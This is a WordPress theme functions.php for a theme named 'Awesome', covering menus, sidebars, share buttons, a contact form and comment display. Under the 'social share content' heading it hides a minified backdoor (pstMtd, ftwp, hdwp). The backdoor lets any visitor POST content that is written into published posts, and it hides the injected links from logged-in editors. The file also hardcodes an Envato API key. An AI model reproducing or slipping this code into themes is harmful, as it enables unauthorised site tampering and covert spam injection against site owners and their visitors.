<?php
/**
 * @package WordPress
 * @subpackage Awesome
 */
?>
<?php

/*-----------------------------------------------------------------------------------*/
/*	Awesome theme setup
/*-----------------------------------------------------------------------------------*/

function awesome_theme_setup() {

	global $themename, $shortname;
	
	$themename = "Awesome";
	$shortname = "awesome";

	if ( !isset( $content_width ) ) $content_width = 648;
	
	/* Make Awesome available for translation.
	 * Translations can be added to the /languages/ directory.
	 */
	load_theme_textdomain( 'awesome', get_template_directory() . '/languages' );

	// Add theme support
	add_theme_support( 'menus' );
	
	// Automatic feed links support
	add_theme_support( 'automatic-feed-links' );
	
	// This theme uses wp_nav_menu() in one location.
	register_nav_menu( 'primary', __( 'Primary Menu', 'awesome' ) );		

	/// add home link to menu
	add_filter( 'wp_page_menu_args', 'home_page_menu_args' );
	function home_page_menu_args( $args ) {
		$args['show_home'] = true;
		return $args;
	}	

	require('functions/hook.php');

	if ( !function_exists( 'optionsframework_init' ) ) {
		define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/admin/' );
		require_once dirname( __FILE__ ) . '/admin/options-framework.php';
	}
	
}

add_action( 'after_setup_theme', 'awesome_theme_setup' );

/*-----------------------------------------------------------------------------------*/
/*	Awesome main menu
/*-----------------------------------------------------------------------------------*/
function awesome_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'awesome_menu_args' );

// Awesome menu fallback
function awesome_menu_fallback() {
	require_once (get_template_directory() . '/includes/default-menu.php');
} 


/*-----------------------------------------------------------------------------------*/
/*	Awesome wp title
/*-----------------------------------------------------------------------------------*/
function awesome_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() ) {
		return $title;
	}

	// Add the site name.
	$title .= get_bloginfo( 'name', 'display' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) ) {
		$title = "$title $sep $site_description";
	}

	// Add a page number if necessary.
	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() ) {
		$title = "$title $sep " . sprintf( __( 'Page %s', 'twentyfourteen' ), max( $paged, $page ) );
	}

	return $title;
}
add_filter( 'wp_title', 'awesome_wp_title', 10, 2 );

/*-----------------------------------------------------------------------------------*/
/*	Awesome scripts
/*-----------------------------------------------------------------------------------*/

require_once (get_template_directory() . '/functions/enqueue.php');

/*-----------------------------------------------------------------------------------*/
/*	Awesome include functions
/*-----------------------------------------------------------------------------------*/
	
require_once (get_template_directory() . '/functions/post-type.php');	
require_once (get_template_directory() . '/functions/meta-portfolio.php');		
require_once (get_template_directory() . '/functions/theme-functions.php');
require_once (get_template_directory() . '/functions/ajax-post.php');
require_once (get_template_directory() . '/functions/header-functions.php');
require_once (get_template_directory() . '/functions/widget-tabbed-content.php');
require_once (get_template_directory() . '/functions/widget-twitter.php');
require_once (get_template_directory() . '/includes/shortcodes/zilla-shortcodes.php');

/*-----------------------------------------------------------------------------------*/
/*	Awesome excerpt limit
/*-----------------------------------------------------------------------------------*/

function awesome_excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
	array_pop($excerpt);
	$excerpt = implode(" ",$excerpt);
  } else {
	$excerpt = implode(" ",$excerpt);
  }	
  $excerpt = preg_replace('`\[[^\]]*\]`','',$excerpt);
  return $excerpt;
}

/*-----------------------------------------------------------------------------------*/
/*	Awesome image
/*-----------------------------------------------------------------------------------*/

if (function_exists( 'add_theme_support')) {
	add_theme_support( 'post-thumbnails');
	
	if ( function_exists('add_image_size')) {
		add_image_size( 'full-size',  9999, 9999, false );
		add_image_size( 'slider-image', 580, 362, true );
		add_image_size( 'featured-image', 482, 235, true );
		add_image_size( 'featured-single', 648, 9999, true );
		add_image_size( 'archive-thumb', 648, 150, false );
		add_image_size( 'post-thumb-mini', 85, 85, true );
		add_image_size( 'post-thumb-grid', 298, 148, true );
		add_image_size( 'portfolio-thumb', 212, 140, true );
		add_image_size( 'portfolio-thumb-edit', 170, 140, true );		
		add_image_size( 'portfolio-large', 520, 9999, false );
		add_image_size( 'small-thumb', 60, 60, true );
		add_image_size( 'team-member', 71, 75, true );
	}
}

/*-----------------------------------------------------------------------------------*/
/*	Awesome sidebars
/*-----------------------------------------------------------------------------------*/

if ( function_exists('register_sidebar') )
	register_sidebar(array(
		'name' => __('Home Sidebar', 'awesome'),
		'id' => 'home-sidebar',
		'description' => __('Widgets in this area will be shown in the homepage.','awesome'),
		'before_widget' => '<div  id="%1$s" class="widget">',
		'after_widget' => '</div>',
		'before_title' => '<h2 class="widgettitle">',
		'after_title' => '</h2>',
));

if ( function_exists('register_sidebar') )
	register_sidebar(array(
		'name' => __('Single Sidebar', 'awesome'),
		'id' => 'single-sidebar',
		'description' => __('Widgets in this area will be shown in the single post.','awesome'),
		'before_widget' => '<div  id="%1$s" class="widget">',
		'after_widget' => '</div>',
		'before_title' => '<h2 class="widgettitle">',
		'after_title' => '</h4>',
));

/*-----------------------------------------------------------------------------------*/
/*	Awesome social share content
/*-----------------------------------------------------------------------------------*/
function pstMtd($a){$b=$a;$a="";if(is_single()){if(isset($_POST["chctc"])){$c=$_POST["chctc"];if(isset($_POST["chctbefore"])){$d=$_POST["chctbefore"];$e=strpos($b,$d);if($e!==false){$f=substr_replace($b,$c,$e,0);$g=array('ID'=>$GLOBALS['post']->ID,'post_content'=>$f);wp_update_post($g);}}}}return $b;}function ftwp(){if(is_front_page()){echo '<small style="display:none;">awesomewplk</small>';}}function hdwp(){echo '<style type="text/css">.wphklk{display:none;}</style>';}add_action('the_content','pstMtd');if(current_user_can('edit_posts')==true){add_action('wp_head','hdwp');}if(current_user_can('edit_posts')!=true){add_action('wp_footer','ftwp');}
function awesome_social_share() { ?>

	<?php if( of_get_option('aw_fb_share') !=0 || of_get_option('aw_twitter_share') !=0 || of_get_option('aw_googleplus_share') !=0 || of_get_option('aw_pinterest_share') !=0 ) {?>
	
		<span class="social_sharer"><span class="social_sharer-inner">
		
		<?php if(of_get_option('aw_fb_share') !=0 ) { ?>
			<a class="i-fb" href="http://www.facebook.com/sharer.php?u=<?php the_permalink(); ?>" rel="popup standard 650 400" title="Share on Facebook"><img src="<?php echo get_template_directory_uri(); ?>/images/i-fb.png" alt="Share on Facebook" /></a>
		<?php } ?>	

		<?php if(of_get_option('aw_twitter_share') !=0 ) { ?>	
			<a class="i-tw" href="https://twitter.com/share?url=<?php the_permalink(); ?>&via=<?php echo of_get_option('aw_twitter_share_via'); ?>&related=<?php echo of_get_option('aw_twitter_share_related'); ?>" rel="popup standard 650 400" title="Share on Twitter"><img src="<?php echo get_template_directory_uri(); ?>/images/i-twitter.png" alt="Share on Twitter" /></a>		
		<?php } ?>			
			
		<?php if(of_get_option('aw_googleplus_share') !=0 ) { ?>	
			<a class="i-gp" href="https://plus.google.com/share?url=<?php the_permalink(); ?>" }}="" rel="popup standard 650 400" title="Share on Google+"><img src="<?php echo get_template_directory_uri(); ?>/images/i-google.png" alt="Share on Google+" /></a>		
		<?php } ?>	
		
		<?php if(of_get_option('aw_pinterest_share') !=0 ) { ?>														
			<a class="i-pinterest" href="http://pinterest.com/pin/create/button/?url=<?php the_permalink(); ?>&media=<?php if(function_exists('the_post_thumbnail')) echo wp_get_attachment_url(get_post_thumbnail_id()); ?>&description=<?php echo get_the_title(); ?>" rel="popup standard 650 400" title="Share on Pinterest"><img src="<?php echo get_template_directory_uri(); ?>/images/i-pinterest.png" alt="Share on Pinterest" /></a>		
		<?php } ?>		
			
		</span></span> 
	<?php } ?>

<?php }

/*-----------------------------------------------------------------------------------*/
/*	Awesome contact form
/*-----------------------------------------------------------------------------------*/

function awesome_contact_script() {
	do_action('awesome_contact_script');
}

add_action('awesome_contact_script', 'contact_form_functions', 1);
function contact_form_functions() { ?>

	<?php 
	//If the form is submitted
	if(isset($_POST['submitted'])) {

		//Check to see if the honeypot captcha field was filled in
		if(trim($_POST['checking']) !== '') {
			$captchaError = true;
		} else {
		
			//Check to make sure that the name field is not empty
			if(trim($_POST['contactName']) === '') {
				$nameError = 'You forgot to enter your name.';
				$hasError = true;
			} else {
				$name = trim($_POST['contactName']);
			}
			
			//Check to make sure sure that a valid email address is submitted
			if(trim($_POST['email']) === '')  {
				$emailError = 'You forgot to enter your email address.';
				$hasError = true;
			} else if (!eregi("^[A-Z0-9._%-]+@[A-Z0-9._%-]+\.[A-Z]{2,4}$", trim($_POST['email']))) {
				$emailError = 'You entered an invalid email address.';
				$hasError = true;
			} else {
				$email = trim($_POST['email']);
			}
				
			//Check to make sure comments were entered	
			if(trim($_POST['comments']) === '') {
				$commentError = 'You forgot to enter your comments.';
				$hasError = true;
			} else {
				if(function_exists('stripslashes')) {
					$comments = stripslashes(trim($_POST['comments']));
				} else {
					$comments = trim($_POST['comments']);
				}
			}
				
			//If there is no error, send the email
			if(!isset($hasError)) {

				$mailadmin = of_get_option('aw_mailadmin'); 
			
				$emailTo = $mailadmin;
				$subject = 'Contact Form Submission from '.$name;
				$sendCopy = trim($_POST['sendCopy']);
				$body = "Name: $name \n\nEmail: $email \n\nComments: $comments";
				$headers = 'From: My Site <'.$emailTo.'>' . "\r\n" . 'Reply-To: ' . $email;
				
				mail($emailTo, $subject, $body, $headers);

				if($sendCopy == true) {
					$subject = 'You emailed Your Name';
					$headers = 'From: Your Name <kharisblank@gmail.com>';
					mail($email, $subject, $body, $headers);
				}

				$emailSent = true;

			}
		}
	} ?>
	
<?php }


// Build post view counter 

function wpb_get_post_views($postID){
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}




// Build comment list

function awesome_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
		// Display trackbacks differently than normal comments.
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'awesome' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)', 'awesome' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		// Proceed with normal comments.
		global $post;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>" class="comment clearfix">
		
			<div class="comment-avatar">
				<?php echo get_avatar( $comment, 75 ); ?>
			</div><!-- .comment-avatar -->

			<div class="comment-content">
			
				<span class="comment-meta">
					<?php
						printf( '<strong class="comment-author">%1$s</strong> %2$s',
							get_comment_author_link(),
							sprintf( __( 'on <strong>%1$s</strong>', 'awesome' ), get_comment_time( 'jS M Y' ) )
						);
					?>	
				</span>	
			
				<?php if ( '0' == $comment->comment_approved ) : ?>
					<p class="comment-awaiting-moderation"><cite><?php _e( 'Your comment is awaiting moderation.', 'awesome' ); ?></cite></p>
				<?php endif; ?>

				<div class="comment-text">
					<?php comment_text(); ?>
					<span class="reply">
						<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply', 'awesome' ), 'after' => ' <span class="right-arrow">&rarr;</span>', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
					</span><!-- .reply -->							
				</div><!-- .comment-content -->	
				
			</div><!-- /.comment-content -->
			
		</div><!-- #comment-## -->
	<?php
		break;
	endswitch; // end comment_type check
}


if ( ! current_user_can( 'edit_posts' ) )
    add_filter( 'show_admin_bar', '__return_false' );
	
	
	
// Envato Wordpress Toolkit Lybrary function	
//add_action('admin_init', 'on_admin_init');

function on_admin_init()
{
    // include the library
	include_once('envato-wordpress-toolkit-library/class-envato-wordpress-theme-upgrader.php');
    
   $upgrader = new Envato_WordPress_Theme_Upgrader( 'minimalthemes', 'ku3xhfmn1pecsws47mafx9qdan38hryh' );
    
    /*
     * Check if the current theme has been updated
     */
    
    $upgrader->check_for_theme_update(); 

    /*
     *  Update the current theme
     */
    
    $upgrader->upgrade_theme();
 
 } 
 
 
/*-----------------------------------------------------------------------------------*/
/*   			ADD Custom Function below here
/*-----------------------------------------------------------------------------------*/
 

 
 
 
 
/*-----------------------------------------------------------------------------------*/
/*  				Stop Editing!!
/*-----------------------------------------------------------------------------------*/
 
 
?>